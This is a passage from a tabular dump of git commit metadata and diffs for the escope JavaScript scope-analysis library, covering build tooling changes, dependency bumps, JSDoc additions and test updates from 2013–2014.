THE USE OF<\n>-  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-*/<\n>-'use strict'<\n>-var gulp = require('gulp');<\n>-var mocha = require('gulp-mocha');<\n>-var jshint = require('gulp-jshint');<\n>-require('coffee-script/register');<\n>-var TEST = [ 'test/*.coffee' ];<\n>-var LINT = [<\n>-    'Gruntfile.js'<c><\n>-    'escope.js'<\n>-];<\n>-gulp.task('test'<c> function () {<\n>-    return gulp.src(TEST)<\n>-    .pipe(mocha({<\n>-        reporter: 'spec'<\n>-    }));<\n>-gulp.task('lint'<c> function () {<\n>-    return gulp.src(LINT).pipe(jshint('.jshintrc'));<\n>-gulp.task('travis'<c> [ 'lint'<c> 'test' ]);<\n>-gulp.task('default'<c> [ 'travis' ]);<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,37,16 Nov 2014,Use coffee-script/register,0,0,1,6,163,+require('coffee-script/register');<\n>+    .pipe(mocha({<\n>+        reporter: 'spec'<\n>+    }));<\n>,-require('coffee-script');<\n>-        .pipe(mocha({ reporter: 'spec' }));<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,32,16 Nov 2014,Update dependencies,0,0,1,18,499,"+    ""estraverse"": "">=1.7.1""<\n>+    ""jshint"": ""~2.5.10""<c><\n>+    ""coffee-script"": ""~1.8.0""<c><\n>+    ""chai"": ""~1.10.0""<c><\n>+    ""esprima"": ""~1.2.2""<c><\n>+    ""jsdoc"": ""~3.3.0-alpha10""<c><\n>+    ""gulp-mocha"": ""~1.1.1""<c><\n>+    ""gulp-jshint"": ""~1.9.0""<c><\n>+    ""gulp"": ""~3.8.10""<\n>","-    ""estraverse"": "">= 0.0.2""<\n>-    ""jshint"": ""~1.1.0""<c><\n>-    ""coffee-script"": ""~1.6.3""<c><\n>-    ""chai"": ""~1.7.2""<c><\n>-    ""esprima"": ""~1.0.3""<c><\n>-    ""jsdoc"": ""~3.3.0-alpha2""<c><\n>-    ""gulp-mocha"": ""~0.3.0""<c><\n>-    ""gulp-jshint"": ""~1.3.4""<c><\n>-    ""gulp"": ""~3.5.2""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Wed,13,13,27 Aug 2014,Merge pull request #36 from tgfjt/patch-1 fix typo in README,0,0,0,0,0,,,F
17,56,56,569,4,26,fujita takashi <fujita@tagpanda.co.jp>,-1,-1,-1,-1,-1,-1,-1,Wed,9,37,27 Aug 2014,fix typo in README Estoggles -> Esgoggles,0,0,1,1,84,+- [Esgoggles](https://github.com/keeyipchan/esgoggles) is JavaScript code browser.<\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,2,20,17 Feb 2014,Merge pull request #32 from nkzawa/patch-1 bump gulp,0,0,0,0,0,,,F
17,56,56,569,4,26,Naoyuki Kanezawa,80,10,707,34,User,1,2977,Mon,1,12,17 Feb 2014,bump gulp,0,0,1,2,44,"+    ""gulp"": ""~3.5.2""<\n>","-    ""gulp"": ""~3.4.1""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,7,38,19 Jan 2014,Use gulp instead of grunt,0,0,2,66,1995,"+  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+'use strict'<\n>+var gulp = require('gulp');<\n>+var mocha = require('gulp-mocha');<\n>+var jshint = require('gulp-jshint');<\n>+require('coffee-script');<\n>+var TEST = [ 'test/*.coffee' ];<\n>+var LINT = [<\n>+    'Gruntfile.js'<c><\n>+    'escope.js'<\n>+];<\n>+gulp.task('test'<c> function () {<\n>+    return gulp.src(TEST)<\n>+        .pipe(mocha({ reporter: 'spec' }));<\n>+gulp.task('lint'<c> function () {<\n>+    return gulp.src(LINT).pipe(jshint('.jshintrc'));<\n>+gulp.task('travis'<c> [ 'lint'<c> 'test' ]);<\n>+gulp.task('default'<c> [ 'travis' ]);<\n>+    ""jsdoc"": ""~3.3.0-alpha2""<c><\n>+    ""gulp-mocha"": ""~0.3.0""<c><\n>+    ""gulp-jshint"": ""~1.3.4""<c><\n>+    ""gulp"": ""~3.4.1""<\n>+    ""test"": ""gulp travis""<c><\n>+    ""unit-test"": ""gulp test""<c><\n>+    ""lint"": ""gulp lint""<c><\n>","-  Copyright (C) 2013 Yusuke Suzuki <utatane.tea@gmail.com><\n>-module.exports = function (grunt) {<\n>-    'use strict';<\n>-    grunt.initConfig({<\n>-        jshint: {<\n>-            all: [<\n>-                'Gruntfile.js'<c><\n>-                'escope.js'<\n>-            ]<c><\n>-            options: {<\n>-                jshintrc: '.jshintrc'<c><\n>-                force: false<\n>-            }<\n>-        }<c><\n>-        mochaTest: {<\n>-            test: {<\n>-                options: {<\n>-                    reporter: 'spec'<c><\n>-                    compilers: 'coffee:coffee-script'<\n>-                }<c><\n>-                src: ['test/*.coffee']<\n>-            }<\n>-        }<\n>-    });<\n>-    // load tasks<\n>-    grunt.loadNpmTasks('grunt-contrib-jshint');<\n>-    grunt.loadNpmTasks('grunt-mocha-test');<\n>-    // alias<\n>-    grunt.registerTask('test'<c> 'mochaTest');<\n>-    grunt.registerTask('lint'<c> 'jshint');<\n>-    grunt.registerTask('travis'<c> ['lint'<c> 'test']);<\n>-    grunt.registerTask('default'<c> 'travis');<\n>-/* vim: set sw=4 ts=4 et tw=80 : */<\n>-    ""grunt-mocha-test"": ""~0.6.3""<c><\n>-    ""grunt-cli"": ""~0.1.9""<c><\n>-    ""grunt"": ""~0.4.2""<c><\n>-    ""grunt-contrib-jshint"": ""~0.6.3""<c><\n>-    ""jsdoc"": ""~3.3.0-alpha2""<\n>-    ""test"": ""grunt travis""<c><\n>-    ""unit-test"": ""grunt test""<c><\n>-    ""lint"": ""grunt lint""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,14,0,18 Jan 2014,Merge pull request #30 from shz/master Remove reliance on nonstandard Syntax.Property (Fix #29),0,0,0,0,0,,,F
17,56,56,569,4,26,Patrick Stein,16,0,13,1,User,1,3453,Mon,16,8,13 Jan 2014,Proper test for ObjectExpression references,0,0,1,11,593,+                                type: 'Identifier'<\n>+                                name: 'a'<\n>+        expect(scope.variables).to.have.length(1)<\n>+        expect(scope.references).to.have.length(2)<\n>+        expect(scope.variables[0].name).to.be.equal('a')<\n>+        expect(scope.references[0].identifier.name).to.be.equal('a')<\n>+        expect(scope.references[1].identifier.name).to.be.equal('a')<\n>,-                                type: 'Literal'<\n>-                                value: 'bar'<\n>-                                raw: 'bar'<\n>-        # TODO - Verify results.  What am I looking for?<\n>,F
17,56,56,569,4,26,Patrick Stein,16,0,13,1,User,1,3453,Mon,16,8,13 Jan 2014,4-space indentation,0,0,1,54,1833,+    it 'doesn\'t require property type'<c> -><\n>+        # Hardcoded AST.  Esprima adds an extra 'Property'<\n>+        # key/value to ObjectExpressions<c> so we're not using<\n>+        # it parse a program string.<\n>+        ast =<\n>+            type: 'Program'<\n>+            body: [{<\n>+                type: 'VariableDeclaration'<\n>+                declarations: [{<\n>+                    type: 'VariableDeclarator'<\n>+                    id:<\n>+                        type: 'Identifier'<\n>+                        name: 'a'<\n>+                    init:<\n>+                        type: 'ObjectExpression'<\n>+                        properties: [{<\n>+                            kind: 'init'<\n>+                            key:<\n>+                                type: 'Identifier'<\n>+                                name: 'foo'<\n>+                            value:<\n>+                                type: 'Literal'<\n>+                                value: 'bar'<\n>+                                raw: 'bar'<\n>+                        }]<\n>+                }]<\n>+        scope = escope.analyze(ast).scopes[0]<\n>+        # TODO - Verify results.  What am I looking for?<\n>,-  it 'doesn\'t require property type'<c> -><\n>-    # Hardcoded AST<\n>-    ast =<\n>-      type: 'Program'<\n>-      body: [{<\n>-        type: 'VariableDeclaration'<\n>-        declarations: [{<\n>-          type: 'VariableDeclarator'<\n>-          id:<\n>-            type: 'Identifier'<\n>-            name: 'a'<\n>-          init:<\n>-            type: 'ObjectExpression'<\n>-            properties: [{<\n>-              kind: 'init'<\n>-              key:<\n>-                type: 'Identifier'<\n>-                name: 'foo'<\n>-              value:<\n>-                type: 'Literal'<\n>-                value: 'bar'<\n>-                raw: 'bar'<\n>-        }]<\n>-      }]<\n>-    scope = escope.analyze(ast).scopes[0]<\n>-    # TODO - Verify results.  What am I looking for?<\n>,F
17,56,56,569,4,26,Patrick Stein,16,0,13,1,User,1,3453,Thu,17,33,9 Jan 2014,Add test skeleton for ObjectExpression fix,0,1,1,31,833,+'use strict'<\n>+expect = require('chai').expect<\n>+escope = require '..'<\n>+describe 'object expression'<c> -><\n>+  it 'doesn\'t require property type'<c> -><\n>+    # Hardcoded AST<\n>+    ast =<\n>+      type: 'Program'<\n>+      body: [{<\n>+        type: 'VariableDeclaration'<\n>+        declarations: [{<\n>+          type: 'VariableDeclarator'<\n>+          id:<\n>+            type: 'Identifier'<\n>+            name: 'a'<\n>+          init:<\n>+            type: 'ObjectExpression'<\n>+            properties: [{<\n>+              kind: 'init'<\n>+              key:<\n>+                type: 'Identifier'<\n>+                name: 'foo'<\n>+              value:<\n>+                type: 'Literal'<\n>+                value: 'bar'<\n>+                raw: 'bar'<\n>+            }]<\n>+        }]<\n>+      }]<\n>+    scope = escope.analyze(ast).scopes[0]<\n>+    # TODO - Verify results.  What am I looking for?<\n>,,F
17,56,56,569,4,26,Patrick Stein,16,0,13,1,User,1,3453,Thu,17,32,9 Jan 2014,Remove reliance on nonstandard Syntax.Property #29,0,0,1,50,1630,+        /**<\n>+         * @member {esprima#Identifier} Reference#identifier<\n>+        /**<\n>+         * @member {Scope} Reference#from<\n>+        /**<\n>+         * @member {Variable} Reference#resolved<\n>+        /**<\n>+         * @member {number} Reference#flag<\n>+            /**<\n>+             * @member {esprima#Node} Reference#writeExpr<\n>+        /**<\n>+         * @member {boolean} Reference#__maybeImplicitGlobal<\n>+    /**<\n>+     * @constant Reference.READ<\n>+    /**<\n>+     * @constant Reference.WRITE<\n>+    /**<\n>+     * @constant Reference.RW<\n>+        /**<\n>+         * @member {String} Variable#name<\n>+        /**<\n>+         * @member {Scope} Variable#scope<\n>+                    for (i = 0; i < node.properties.length; i++) {<\n>+                        if (node.properties[i].kind === 'init') {<\n>+                            currentScope.__referencing(node.properties[i].value);<\n>+                        }<\n>+                    }<\n>,-        /** <\n>-         * @member {esprima#Identifier} Reference#identifier <\n>-        /** <\n>-         * @member {Scope} Reference#from <\n>-        /** <\n>-         * @member {Variable} Reference#resolved <\n>-        /** <\n>-         * @member {number} Reference#flag <\n>-            /** <\n>-             * @member {esprima#Node} Reference#writeExpr <\n>-        /** <\n>-         * @member {boolean} Reference#__maybeImplicitGlobal <\n>-    /** <\n>-     * @constant Reference.READ <\n>-    /** <\n>-     * @constant Reference.WRITE <\n>-    /** <\n>-     * @constant Reference.RW <\n>-        /**  <\n>-         * @member {String} Variable#name <\n>-        /** <\n>-         * @member {Scope} Variable#scope <\n>-                    currentScope.__referencing(node.value);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,1,43,23 Dec 2013,Merge remote branch origin/pr/28 Conflicts: README.md,0,0,0,0,0,,,F
17,56,56,569,4,26,thron7 <thron7@users.sourceforge.net>,-1,-1,-1,-1,-1,-1,-1,Wed,22,48,27 Nov 2013,fixed link to online API docs,0,0,1,2,136,+Generated JSDoc is [here](http://constellation.github.io/escope/).<\n>,-Generated JSDoc is [here](http://github.com/Constellation/escope).<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,4,11,28 Nov 2013,version 1.0.2-dev starts,0,0,4,8,263,"+### Document<\n>+Generated JSDoc is [here](http://github.com/Constellation/escope).<\n>+  ""version"": ""1.0.2-dev""<c><\n>+    exports.version = '1.0.2-dev';<\n>+  ""version"": ""1.0.2-dev""<c><\n>","-  ""version"": ""0.0.14-dev""<c><\n>-    exports.version = '1.0.1-dev';<\n>-  ""version"": ""1.0.1-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,3,55,28 Nov 2013,Add JSDoc setting,0,0,2,9,231,"+/out/<\n>+    ""grunt"": ""~0.4.2""<c><\n>+    ""esprima"": ""~1.0.3""<c><\n>+    ""jsdoc"": ""~3.3.0-alpha2""<\n>+    ""lint"": ""grunt lint""<c><\n>+    ""jsdoc"": ""jsdoc escope.js README.md""<\n>","-    ""grunt"": ""~0.4.1""<c><\n>-    ""esprima"": ""~1.0.3""<\n>-    ""lint"": ""grunt lint""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,4,11,28 Nov 2013,version 1.0.2-dev starts,0,0,4,8,263,"+### Document<\n>+Generated JSDoc is [here](http://github.com/Constellation/escope).<\n>+  ""version"": ""1.0.2-dev""<c><\n>+    exports.version = '1.0.2-dev';<\n>+  ""version"": ""1.0.2-dev""<c><\n>","-  ""version"": ""0.0.14-dev""<c><\n>-    exports.version = '1.0.1-dev';<\n>-  ""version"": ""1.0.1-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Thu,3,55,28 Nov 2013,Add JSDoc setting,0,0,2,9,231,"+/out/<\n>+    ""grunt"": ""~0.4.2""<c><\n>+    ""esprima"": ""~1.0.3""<c><\n>+    ""jsdoc"": ""~3.3.0-alpha2""<\n>+    ""lint"": ""grunt lint""<c><\n>+    ""jsdoc"": ""jsdoc escope.js README.md""<\n>","-    ""grunt"": ""~0.4.1""<c><\n>-    ""esprima"": ""~1.0.3""<\n>-    ""lint"": ""grunt lint""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Wed,10,25,27 Nov 2013,Merge pull request #26 from thron7/th_jsdoc Added some initial JSDoc comments,0,0,0,0,0,,,F
17,56,56,569,4,26,thron7 <thron7@users.sourceforge.net>,-1,-1,-1,-1,-1,-1,-1,Wed,18,52,27 Nov 2013,incorporated constellations feedback,0,0,1,73,2643,+        /** <\n>+         * Identifier syntax node.<\n>+         * @member {esprima#Identifier} Reference#identifier <\n>+         */<\n>+        /** <\n>+         * Reference to the enclosing Scope.<\n>+         * @member {Scope} Reference#from <\n>+         */<\n>+        /**<\n>+         * Whether the reference comes from a dynamic scope (such as 'eval'<c><\n>+         * 'with'<c> etc.)<c> and may be trapped by dynamic scopes.<\n>+         * @member {boolean} Reference#tainted<\n>+         */<\n>+        /** <\n>+         * The variable this reference is resolved with.<\n>+         * @member {Variable} Reference#resolved <\n>+         */<\n>+        /** <\n>+         * The read-write mode of the reference. (Value is one of {@link<\n>+         * Reference.READ}<c> {@link Reference.RW}<c> {@link Reference.WRITE}).<\n>+         * @member {number} Reference#flag <\n>+         * @private<\n>+         */<\n>+            /** <\n>+             * If reference is writeable<c> this is the tree being written to it.<\n>+             * @member {esprima#Node} Reference#writeExpr <\n>+             */<\n>+        /** <\n>+         * Whether the Reference might refer to a global variable.<\n>+         * @member {boolean} Reference#__maybeImplicitGlobal <\n>+         * @private<\n>+         */<\n>+    /** <\n>+     * @constant Reference.READ <\n>+     * @private<\n>+     */<\n>+    /** <\n>+     * @constant Reference.WRITE <\n>+     * @private<\n>+     */<\n>+    /** <\n>+     * @constant Reference.RW <\n>+     * @private<\n>+     */<\n>+     * Whether the reference is static.<\n>+     * Whether the reference is writeable.<\n>+     * @method Reference#isWrite<\n>+     * Whether the reference is readable.<\n>+     * Whether the reference is read-only.<\n>+     * Whether the reference is write-only.<\n>+     * Whether the reference is read-write.<\n>+         * The {@link Reference|references} that are not resolved with this scope.<\n>+         * @member {Reference[]} Scope#through<\n>,-        /** Identifier syntax node.<\n>-         * @member {esprima#Identifier} Reference#identifier */<\n>-        /** Reference to the enclosing Scope.<\n>-         * @member {Scope} Reference#from */<\n>-        /** ???<\n>-         * @member {boolean} Reference#tainted */<\n>-        /** ???<\n>-         * @member {boolean} Reference#resolved */<\n>-        /** ???<\n>-         * @member {boolean} Reference#flag */<\n>-            /** ???<\n>-             * @member {boolean} Reference#writeExpr */<\n>-        /** Whether the Reference might refer to a global variable.<\n>-         * @member {boolean} Reference#__maybeImplicitGlobal */<\n>-    /** @constant Reference.READ */<\n>-    /** @constant Reference.WRITE */<\n>-    /** @constant Reference.RW */<\n>-     * @method Reference#isStatic<\n>-         * ??<\n>-         * @member {Array} Scope#through<\n>,F
17,56,56,569,4,26,thron7 <thron7@users.sourceforge.net>,-1,-1,-1,-1,-1,-1,-1,Tue,10,27,12 Nov 2013,fixed mangled code,0,0,1,17,604,+        /**<\n>+         * Whether this is a stack variable.<\n>+         * @member {boolean} Variable#stack<\n>+         */<\n>+         /**<\n>+         * The scoped {@link Variable}s of this scope<c> as <code>{ Variable.name<\n>+         * : Variable }</code>.<\n>+         * @member {Map} Scope#set<\n>+         */<\n>+        /**<\n>+         * The tainted variables of this scope<c> as <code>{ Variable.name :<\n>+         * boolean }</code>.<\n>+            for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>,-        /** ???<\n>-         * @member {Map} Scope#set */<\n>-        /** ???<\n>-            for (i = 0<c> izleft.length; i < iz; ++i) {<\n>,F
17,56,56,569,4,26,thron7 <thron7@users.sourceforge.net>,-1,-1,-1,-1,-1,-1,-1,Fri,17,29,8 Nov 2013,more attempts to get the exports attached to the module,0,0,1,11,326,+ * @module<\n>+    /** @name module:escope.version */<\n>+    /** @name module:escope.Reference */<\n>+    /** @name module:escope.Variable */<\n>+    /** @name module:escope.Scope */<\n>+    /** @name module:escope.ScopeManager */<\n>+    /** @name module:escope.analyze */<\n>,- * @module escope<\n>-    /**<\n>-     * @member escope.version<\n>-     */<\n>,F
17,56,56,569,4,26,thron7 <thron7@users.sourceforge.net>,-1,-1,-1,-1,-1,-1,-1,Fri,16,54,8 Nov 2013,added module introduction,0,0,1,51,3011,"+/**<\n>+ * Escope (<a href=""http://github.com/Constellation/escope"">escope</a>) is an <a<\n>+ * href=""http://www.ecma-international.org/publications/standards/Ecma-262.htm"">ECMAScript</a><\n>+ * scope analyzer extracted from the <a<\n>+ * href=""http://github.com/Constellation/esmangle"">esmangle project</a/>.<\n>+ * <p><\n>+ * <em>escope</em> finds lexical scopes in a source program<c> i.e. areas of that<\n>+ * program where different occurrences of the same identifier refer to the same<\n>+ * variable. With each scope the contained variables are collected<c> and each<\n>+ * identifier reference in code is linked to its corresponding variable (if<\n>+ * possible).<\n>+ * <p><\n>+ * <em>escope</em> works on a syntax tree of the parsed source code which has<\n>+ * to adhere to the <a<\n>+ * href=""https://developer.mozilla.org/en-US/docs/SpiderMonkey/Parser_API""><\n>+ * Mozilla Parser API</a>. E.g. <a href=""http://esprima.org"">esprima</a> is a parser<\n>+ * that produces such syntax trees.<\n>+ * <p><\n>+ * The main interface is the {@link analyze} function.<\n>+ * @module escope<\n>+ */<\n>+         * List of {@link Reference|references} of this variable (excluding parameter entries)<\n>+         * Generally<c> through the lexical scoping of JS you can always know<\n>+         * which variable an identifier in the source code refers to. There are<\n>+         * a few exceptions to this rule. With 'global' and 'with' scopes you<\n>+         * can only decide at runtime which variable a reference refers to.<\n>+         * Moreover<c> if 'eval()' is used in a scope<c> it might introduce new<\n>+         * bindings in this or its prarent scopes.<\n>+         * All those scopes are considered 'dynamic'.<\n>+         * List of {@link Reference}s that are left to be resolved (i.e. which<\n>+         * need to be linked to the variable they refer to). Used internally to<\n>+         * resolve bindings during scope analysis. On a finalized scope<\n>+         * analysis<c> all sopes have <em>left</em> value <strong>null</strong>.<\n>+         * For 'global' and 'function' scopes<c> this is a self-reference. For<\n>+         * other scope types this is the <em>variableScope</em> value of the<\n>+         * parent scope.<\n>+         * Whether this scope is created by a FunctionExpression.<\n>+         * Whether this is a scope that contains an 'eval()' invocation.<\n>+            for (i = 0<c> izleft.length; i < iz; ++i) {<\n>+    /**<\n>+     * @member escope.version<\n>+     */<\n>",-         * List of occurrences of this variable (excluding parameter entries)<\n>-         * Generally<c> through the lexical scoping of JS you can always know which<\n>-         * variable an identifier in the source code refers to.  There are two<\n>-         * exceptions to this rule: the 'global' and the 'with' scope.<\n>-         * In both cases<c> you can only decide at runtime which variable a<\n>-         * reference refers to. Hence those scope types are 'dynamic'.<\n>-         * List of {@link Reference}s.<\n>-         * For 'global' and 'function' scopes<c> this is a self-reference.<\n>-            for (i = 0<c> iz = this.left.length; i < iz; ++i) {<\n>,F
17,56,56,569,4,26,thron7 <thron7@users.sourceforge.net>,-1,-1,-1,-1,-1,-1,-1,Fri,14,12,8 Nov 2013,more api doc for Scope Variable,0,0,1,80,3433,+         * The variable name<c> as given in the source code.<\n>+         * List of defining occurrences of this variable (like in 'var ...'<\n>+         * List of occurrences of this variable (excluding parameter entries)<\n>+         * in its defining scope and all nested scopes. For defining<\n>+         * occurrences only see {@link Variable#defs}.<\n>+         * List of defining occurrences of this variable (like in 'var ...'<\n>+        /**<\n>+         * One of 'catch'<c> 'with'<c> 'function' or 'global'.<\n>+         * @member {String} Scope#type<\n>+         */<\n>+        /** ???<\n>+         * @member {Map} Scope#set */<\n>+        /** ???<\n>+         * @member {Map} Scope#taints */<\n>+        /**<\n>+         * Generally<c> through the lexical scoping of JS you can always know which<\n>+         * variable an identifier in the source code refers to.  There are two<\n>+         * exceptions to this rule: the 'global' and the 'with' scope.<\n>+         * In both cases<c> you can only decide at runtime which variable a<\n>+         * reference refers to. Hence those scope types are 'dynamic'.<\n>+         * @member {boolean} Scope#dynamic<\n>+         */<\n>+        /**<\n>+         * A reference to the scope-defining syntax node.<\n>+         * @member {esprima.Node} Scope#block<\n>+         */<\n>+         /**<\n>+         * ??<\n>+         * @member {Array} Scope#through<\n>+         */<\n>+         /**<\n>+         * The scoped {@link Variable}s of this scope. In the case of a<\n>+         * 'function' scope this includes the automatic argument <em>arguments</em> as<\n>+         * its first element<c> as well as all further formal arguments.<\n>+         * @member {Variable[]} Scope#variables<\n>+         */<\n>+         /**<\n>+         * Any variable {@link Reference|reference} found in this scope. This<\n>+         * includes occurrences of local variables as well as variables from<\n>+         * parent scopes (including the global scope). For local variables<\n>+         * this also includes defining occurrences (like in a 'var' statement).<\n>+         * In a 'function' scope this does not include the occurrences of the<\n>+         * formal parameter in the parameter list.<\n>+         * @member {Reference[]} Scope#references<\n>+         */<\n>+         /**<\n>+         * List of {@link Reference}s.<\n>+         * @member {Reference[]} Scope#left<\n>+         */<\n>+         /**<\n>+         * For 'global' and 'function' scopes<c> this is a self-reference.<\n>+         * @member {Scope} Scope#variableScope<\n>+         */<\n>+         /**<\n>+         * @member {boolean} Scope#functionExpressionScope<\n>+         */<\n>+         /**<\n>+         * @member {boolean} Scope#directCallToEvalScope<\n>+         */<\n>+         /**<\n>+         * @member {boolean} Scope#thisFound<\n>+         */<\n>+         /**<\n>+         * Reference to the parent {@link Scope|scope}.<\n>+         * @member {Scope} Scope#upper<\n>+         */<\n>+         /**<\n>+         * Whether 'use strict' is in effect in this scope.<\n>+         * @member {boolean} Scope#isStrict<\n>+         */<\n>+         /**<\n>+         * List of nested {@link Scope}s.<\n>+         * @member {Scope[]} Scope#childScopes<\n>+         */<\n>,-         * The source representation of the identifier.<\n>-         * List of defining occurrences of this identifier (like in 'var ...'<\n>-         * List of occurrences of this identifier in this<\n>-         * scope (excluding parameter entries). For defining occurrences only<\n>-         * see {@link Variable#defs}.<\n>-         * List of defining occurrences of this identifier (like in 'var ...'<\n>,F
17,56,56,569,4,26,thron7 <thron7@users.sourceforge.net>,-1,-1,-1,-1,-1,-1,-1,Wed,19,49,6 Nov 2013,more work on the Variable class,0,0,1,36,1958,"+        /**<\n>+         * List of defining occurrences of this identifier (like in 'var ...'<\n>+         * statements or as parameter)<c> as AST nodes.<\n>+         * @member {esprima.Identifier[]} Variable#identifiers<\n>+         */<\n>+        /**<\n>+         * List of occurrences of this identifier in this<\n>+         * scope (excluding parameter entries). For defining occurrences only<\n>+         * see {@link Variable#defs}.<\n>+         * @member {Reference[]} Variable#references<\n>+         */<\n>+         * List of defining occurrences of this identifier (like in 'var ...'<\n>+         * statements or as parameter)<c> as custom objects.<\n>+         * @typedef {Object} DefEntry<\n>+         * @property {String} DefEntry.type - the type of the occurrence (e.g.<\n>+         *      ""Parameter""<c> ""Variable""<c> ...)<\n>+         * @property {esprima.Identifier} DefEntry.name - the identifier AST node of the occurrence<\n>+         * @property {esprima.Node} DefEntry.node - the enclosing node of the<\n>+         *      identifier<\n>+         * @property {esprima.Node} [DefEntry.parent] - the enclosing statement<\n>+         *      node of the identifier<\n>+         * @member {DefEntry[]} Variable#defs<\n>+        /** <\n>+         * Reference to the enclosing Scope.<\n>+         * @member {Scope} Variable#scope <\n>+         */<\n>+     * Main interface function. Takes an Esprima syntax tree and returns the<\n>+     * @param {Object} providedOptions - Options that tailor the scope analysis<\n>+     * @param {boolean} [providedOptions.optimistic=false] - the optimistic flag<\n>+     * @param {boolean} [providedOptions.directive=false]- the directive flag<\n>+     * @param {boolean} [providedOptions.ignoreEval=false]- whether to check 'eval()' calls<\n>",-         * List of defining occurrences of this identifier (like 'var ...'<\n>-         * statements).<\n>-         * @member {Reference[]} Variable#defs<\n>-     * Main interface function. Takes a Esprima syntax tree and returns the<\n>-     * @param {Object} providedOptions<\n>,F
17,56,56,569,4,26,thron7 <thron7@users.sourceforge.net>,-1,-1,-1,-1,-1,-1,-1,Wed,18,14,6 Nov 2013,some initial jsdoc comments,0,0,2,75,2123,+# JSDoc<\n>+/out/<\n>+    /**<\n>+     * A Reference represents a single occurrence of an identifier in code.<\n>+     * @class Reference<\n>+     */<\n>+        /** Identifier syntax node.<\n>+         * @member {esprima#Identifier} Reference#identifier */<\n>+        /** Reference to the enclosing Scope.<\n>+         * @member {Scope} Reference#from */<\n>+        /** ???<\n>+         * @member {boolean} Reference#tainted */<\n>+        /** ???<\n>+         * @member {boolean} Reference#resolved */<\n>+        /** ???<\n>+         * @member {boolean} Reference#flag */<\n>+            /** ???<\n>+             * @member {boolean} Reference#writeExpr */<\n>+        /** Whether the Reference might refer to a global variable.<\n>+         * @member {boolean} Reference#__maybeImplicitGlobal */<\n>+    /** @constant Reference.READ */<\n>+    /** @constant Reference.WRITE */<\n>+    /** @constant Reference.RW */<\n>+    /**<\n>+     * @method Reference#isStatic<\n>+     * @return {boolean}<\n>+     */<\n>+    /**<\n>+     * @method Reference#isStatic<\n>+     * @return {boolean}<\n>+     */<\n>+    /**<\n>+     * @method Reference#isRead<\n>+     * @return {boolean}<\n>+     */<\n>+    /**<\n>+     * @method Reference#isReadOnly<\n>+     * @return {boolean}<\n>+     */<\n>+    /**<\n>+     * @method Reference#isWriteOnly<\n>+     * @return {boolean}<\n>+     */<\n>+    /**<\n>+     * @method Reference#isReadWrite<\n>+     * @return {boolean}<\n>+     */<\n>+    /**<\n>+     * A Variable represents a locally scoped identifier. These include arguments to<\n>+     * functions.<\n>+     * @class Variable<\n>+     */<\n>+        /**  <\n>+         * The source representation of the identifier.<\n>+         * @member {String} Variable#name <\n>+         */<\n>+        /**<\n>+         * List of defining occurrences of this identifier (like 'var ...'<\n>+         * statements).<\n>+         * @member {Reference[]} Variable#defs<\n>+         */<\n>+    /**<\n>+     * @class Scope<\n>+     */<\n>+    /**<\n>+     * @class ScopeManager<\n>+     */<\n>+    /**<\n>+     * Main interface function. Takes a Esprima syntax tree and returns the<\n>+     * analyzed scopes.<\n>+     * @function analyze<\n>+     * @param {esprima.Tree} tree<\n>+     * @param {Object} providedOptions<\n>+     * @return {ScopeManager}<\n>+     */<\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,15,28,17 Aug 2013,version 1.0.1-dev starts,0,0,2,4,128,"+    exports.version = '1.0.1-dev';<\n>+  ""version"": ""1.0.1-dev""<c><\n>","-    exports.version = '0.0.17-dev';<\n>-  ""version"": ""0.0.17-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,15,27,17 Aug 2013,Remove ImplicitGloabalVariable and add globalScope.implicit,0,0,2,118,4314,"+            globalScope.implicit = {<\n>+                set: new Map()<c><\n>+                variables: []<\n>+            };<\n>+        var i<c> iz<c> ref<c> current<c> node<c> implicit;<\n>+            implicit = [];<\n>+                if (ref.__maybeImplicitGlobal && !this.set.has(ref.identifier.name)) {<\n>+                    implicit.push(ref.__maybeImplicitGlobal);<\n>+            // create an implicit global variable from assignment expression<\n>+            for (i = 0<c> iz = implicit.length; i < iz; ++i) {<\n>+                node = implicit[i];<\n>+                this.__defineImplicit(node.left<c> {<\n>+                    type: Variable.ImplicitGlobalVariable<c><\n>+                    name: node.left<c><\n>+                    node: node<\n>+                });<\n>+            }<\n>+    Scope.prototype.__defineImplicit = function __defineImplicit(node<c> info) {<\n>+        var name<c> variable;<\n>+        if (node && node.type === Syntax.Identifier) {<\n>+            name = node.name;<\n>+            if (!this.implicit.set.has(name)) {<\n>+                variable = new Variable(name<c> this);<\n>+                variable.identifiers.push(node);<\n>+                variable.defs.push(info);<\n>+                this.implicit.set.set(name<c> variable);<\n>+                this.implicit.variables.push(variable);<\n>+            } else {<\n>+                variable = this.implicit.set.get(name);<\n>+                variable.identifiers.push(node);<\n>+                variable.defs.push(info);<\n>+            }<\n>+        }<\n>+    };<\n>+    it 'assignments global scope'<c> -><\n>+        ast = esprima.parse """"""<\n>+        var x = 20;<\n>+        x = 300;<\n>+        """"""<\n>+        scopes = escope.analyze(ast).scopes<\n>+        expect(scopes.map((scope) -><\n>+            scope.variables.map((variable) -><\n>+                variable.defs.map((def) -> def.type)))).to.be.eql(<\n>+            [<\n>+                [<\n>+                    [<\n>+                        'Variable'<\n>+                    ]<\n>+              